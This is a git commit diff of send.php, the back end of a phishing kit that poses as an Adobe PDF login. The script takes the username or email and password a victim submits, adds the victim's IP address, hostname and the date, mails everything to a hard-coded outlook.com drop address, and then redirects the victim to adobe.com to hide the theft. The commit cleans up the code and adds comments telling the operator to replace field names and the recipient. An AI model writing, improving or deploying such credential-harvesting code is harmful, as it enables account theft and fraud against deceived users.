b907f51c532a0cc4726101966ee5e50b5e286d62
henrycrane65 <henrycrane65@gmail.com>
2025-02-04 06:12:22 -0500

    Update send.php

--- send.php
+++ send.php
@@ -1,32 +1,32 @@
-<?
+<?php
 
-$adddate=date("D M d, Y g:i a");
+$adddate = date("D M d, Y g:i a");
 $ip = getenv("REMOTE_ADDR");
 $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-$message .= "Username: ".$_POST['customeru']."\n";
-$message .= "Password: ".$_POST['customerp']."\n";
+
+// Replace 'userID' and 'password' with the correct field names in your form
+$message .= "User ID (Email): " . $_POST['userID'] . "\n"; // email or user ID
+$message .= "Password: " . $_POST['password'] . "\n"; // password
 $message .= "\n";
-$message .= "Date: ".$adddate."\n";
-$message .= "Host: ".$host."\n";
-$message .= "IP: ".$ip."\n";
+$message .= "Date: " . $adddate . "\n";
+$message .= "Host: " . $host . "\n";
+$message .= "IP: " . $ip . "\n";
 $message .= "------------- DataMASTER -------------\n";
-$recipient = "anthonytaylor.w1@outlook.com";
-$subject = "PDF! Successful ".$_POST['username']."\n";
-$from = "$ip";
-$headers .= $_POST['eMailAdd']."\n";
+
+// Replace with your recipient's email
+$recipient = "anthonytaylor.w1@outlook.com"; 
+$subject = "PDF! Successful " . $_POST['userID'] . "\n"; // Using the email as part of the subject
+$from = "$ip"; // Sender's email is the IP address
+$headers .= $_POST['eMailAdd'] . "\n"; // Assuming 'eMailAdd' is an additional email field
 $headers .= "MIME-Version: 1.0\n";
 $headers = "From: $from\r\n";
 $headers .= '' . "\r\n";
-	 mail("$to", "$subject", $message);
-if (mail($recipient,$subject,$message,$headers))
-	   {
-		   header("Location:  https://adobe.com/");
 
-	   }
-else
-    	   {
-		   header("Location:  index.html");
-
-	   }
+// Send email
+if (mail($recipient, $subject, $message, $headers)) {
+    header("Location: https://adobe.com/");
+} else {
+    header("Location: index.html");
+}
 
 ?>
